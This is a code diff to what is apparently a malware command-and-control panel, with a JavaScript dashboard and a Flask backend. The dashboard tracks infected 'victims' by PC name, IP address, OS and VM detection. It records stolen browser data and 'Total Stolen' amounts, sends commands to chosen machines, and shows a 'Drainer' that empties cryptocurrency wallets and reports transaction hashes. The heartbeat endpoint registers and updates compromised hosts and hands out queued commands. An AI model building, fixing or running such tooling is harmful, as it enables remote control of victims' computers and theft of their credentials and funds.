@@ -372,17 +372,57 @@ function details(){
     const stolen=v.total_stolen||0;
     
     document.getElementById('details').innerHTML=`
-<div class="row"><span class="label">ID</span><span class="value">\${v.id}</span></div>
-<div class="row"><span class="label">PC Name</span><span class="value">\${pc}</span></div>
-<div class="row"><span class="label">IP Address</span><span class="value">\${ip}</span></div>
-<div class="row"><span class="label">Operating System</span><span class="value">\${os}</span></div>
+<div class="row"><span class="label">ID</span><span class="value">${v.id}</span></div>
+<div class="row"><span class="label">PC Name</span><span class="value">${pc}</span></div>
+<div class="row"><span class="label">IP Address</span><span class="value">${ip}</span></div>
+<div class="row"><span class="label">Operating System</span><span class="value">${os}</span></div>
 <div class="row"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div>
 <div class="row"><span class="label">VM Detected</span><span class="value ${v.is_vm?'vm':'online'}">${v.is_vm?'YES':'NO'}</span></div>
 <div class="row"><span class="label">Total Stolen</span><span class="value money">$${stolen.toLocaleString()}</span></div>
-<div class="row"><span class="label">Browser Data</span><span class="value">${v.browser_stolen?'✓ Stolen':'Not stolen'}</span></div>__PROTECTED_4__${w.currency}: ${w.balance} → $${w.usd.toLocaleString()}`,'drainer');
+<div class="row"><span class="label">Browser Data</span><span class="value">${v.browser_stolen?'✓ Stolen':'Not stolen'}</span></div>`;
+}
+
+function stats(){
+    const v=Object.values(victims);
+    document.getElementById('t').textContent=v.length;
+    document.getElementById('o').textContent=v.filter(x=>x.status==='Online').length;
+    document.getElementById('v').textContent=v.filter(x=>x.is_vm).length;
+    document.getElementById('d').textContent='$'+v.reduce((a,b)=>a+(b.total_stolen||0),0).toLocaleString();
+}
+
+async function api(data){
+    try{
+        const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+        return await r.json();
+    }catch(e){return{success:false,error:'Network error'};}
+}
+
+async function refresh(){
+    const d=await api({action:'getVictims'});
+    if(d.success){
+        victims=d.victims||{};
+        render();
+        stats();
+        if(current&&victims[current])details();
+    }
+}
+
+async function send(){
+    if(!current){add('System','Select a victim first');return;}
+    const c=document.getElementById('cmd').value.trim();
+    if(!c)return;
+    document.getElementById('cmd').value='';
+    add('You',c);
+    
+    const r=await api({action:'sendCommand',victim_id:current,command:c});
+    if(r.success){
+        if(r.wallets){
+            let total=0;
+            r.wallets.forEach(w=>{
+                add('Drainer',`${w.currency}: ${w.balance} → $${w.usd.toLocaleString()}`,'drainer');
                 total+=w.usd;
             });
-            add('Blockchain',`TX: ${r.tx_hash}\\nTotal: $\${total.toLocaleString()}`,'drainer');
+            add('Blockchain',`TX: ${r.tx_hash}\\nTotal: $${total.toLocaleString()}`,'drainer');
             victims[current].total_stolen=(victims[current].total_stolen||0)+total;
             stats();details();
         }else{
@@ -501,7 +541,7 @@ def api_handler():
                 
                 result['wallets'] = wallets
                 result['tx_hash'] = tx_hash
-                result['output'] = f"Drained \${total:,.2f} from {len(wallets)} wallets"
+                result['output'] = f"Drained ${total:,.2f} from {len(wallets)} wallets"
                 
                 with get_db() as conn:
                     c = conn.cursor()
@@ -566,7 +606,7 @@ def heartbeat():
             now = datetime.datetime.now().isoformat()
             
             # Check if victim exists
-            c.execute("SELECT id, is_vm FROM victims WHERE id = ?", (vid,))
+            c.execute("SELECT id, is_vm, first_seen FROM victims WHERE id = ?", (vid,))
             existing = c.fetchone()
             
             pc_name = data.get('pc', 'Unknown')[:64]
@@ -579,4 +619,29 @@ def heartbeat():
                 # Update existing - preserve is_vm if already set to 1
                 new_is_vm = max(is_vm, existing['is_vm'])
                 c.execute("""UPDATE victims 
-                            SET status = 'Online
+                            SET 
+                            pc_name=?, 
+                            ip_address=?, 
+                            os_info=?, 
+                            is_vm=?, 
+                            vm_score=?, 
+                            last_seen=?, 
+                            activity=?, 
+                            status='Online' 
+                            WHERE id=?""", 
+                             (pc_name, ip_addr, os_info, new_is_vm, 0, now, activity, vid))
+            else:
+                # Insert new victim
+                c.execute("""INSERT INTO victims 
+                            (id, pc_name, ip_address, os_info, is_vm, vm_score, first_seen, last_seen, activity, status) 
+                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", 
+                             (vid, pc_name, ip_addr, os_info, is_vm, 0, now, now, activity, 'Online'))
+            
+            return jsonify({'success': True, 'command': data.get('command')})
+        
+    except Exception as e:
+        print(f"Heartbeat Error: {e}")
+        return jsonify({'success': False, 'error': 'Internal server error'}), 500
+
+if __name__ == '__main__':
+    app.run(port=PORT, debug=True)
